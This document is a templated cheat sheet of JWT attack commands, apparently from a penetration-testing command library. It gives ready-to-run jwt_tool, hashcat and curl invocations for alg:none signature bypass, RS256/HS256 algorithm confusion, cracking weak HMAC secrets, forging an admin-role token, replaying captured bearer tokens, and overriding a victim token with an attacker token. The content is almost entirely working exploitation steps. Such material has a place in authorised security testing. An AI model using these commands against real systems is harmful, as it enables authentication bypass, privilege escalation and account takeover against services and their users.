# JWT Token Attacks

> JSON Web Token testing and exploitation techniques

<!-- tags: jwt,auth,token,bypass,web -->

---

## bypass jwt none alg
Strip signature and force `alg: none` to bypass signature verification.

```bash
python3 jwt_tool.py {{JWT:str}} -I -A none -S
```

<!-- meta: risk=high | phase=exploit | tags=none-alg,bypass -->

---

## bypass jwt alg confusion rs256 hs256
Switch RS256 to HS256 and sign with the public key as the HMAC secret.

```bash
python3 jwt_tool.py {{JWT:str}} -I -A HS256 --pubkey {{PUBKEY:file:public.pem}} --force
```

<!-- meta: risk=high | phase=exploit | tags=alg-confusion,rs256,hs256 -->

---

## crack jwt hmac secret hashcat
Hashcat mode 16500 cracks JWT-HS256 weak secrets.

```bash
hashcat -a 0 -m 16500 {{JWT:str}} {{WORDLIST:wordlist:/usr/share/wordlists/rockyou.txt}}
```

<!-- meta: risk=safe | phase=passwords | tags=hashcat,brute-force,hs256 -->

---

## crack jwt secret wordlist
Try secrets from a wordlist against a JWT.

```bash
jwt-cracker {{JWT:str}} -w {{WORDLIST:wordlist:/usr/share/wordlists/rockyou.txt}}
```

<!-- meta: risk=safe | phase=passwords | tags=jwt-cracker,wordlist -->

---

## decode jwt claims
Decode header and payload claims for inspection.

```bash
python3 jwt_tool.py {{JWT:str}} -pc
```

<!-- meta: risk=safe | phase=recon | tags=inspect,decode -->

---

## forge jwt sign secret
Generate a forged JWT once secret is known (e.g., from staging).

```bash
python3 jwt_tool.py --sign -A HS256 --key '{{SECRET:str}}' -C '{"role":"admin"}'
```

<!-- meta: risk=critical | phase=exploit | tags=forge,sign -->

---

## replay jwt bearer header
Send a captured JWT in the Authorization header.

```bash
curl -H "Authorization: Bearer {{JWT:str}}" {{URL:url}}
```

<!-- meta: risk=high | phase=exploit | tags=replay,bearer -->

---

## bypass jwt multi source override
Send malicious token in query while a victim token is in the header.

```bash
curl "{{URL:url}}?token={{ATTACKER_JWT:str}}" -H "Authorization: Bearer {{VICTIM_JWT:str}}"
```

<!-- meta: risk=high | phase=exploit | tags=multi-source,override -->
